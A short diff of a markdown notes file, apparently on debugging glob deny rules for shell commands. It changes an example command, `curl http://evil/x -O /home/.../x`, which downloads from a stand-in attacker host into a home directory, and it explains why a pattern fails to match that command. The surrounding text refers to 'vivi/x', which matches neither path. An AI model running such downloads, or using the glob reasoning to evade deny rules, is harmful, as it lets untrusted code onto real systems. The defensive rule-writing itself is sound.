@@ -47,7 +47,7 @@ I am least sure about — see below.
 ## What the fix pass taught me, in order
 
 **I was wrong about `* -O /home/*` and about the hyphen.** `* -O /home/*` has a space *before* `-O`.
-Against `curl http://evil/x -O /home/u/x` it fails not because of the space but because `*` cannot
+Against `curl http://evil/x -O /home/svc-example/x` it fails not because of the space but because `*` cannot
 cross a `/`: one trailing `/*` segment cannot carry `vivi/x`. The fix needs a **second** segment
 (`*-O /home/*/*`), and it must lose the space at the same time. Two independent defects in one glob.
 
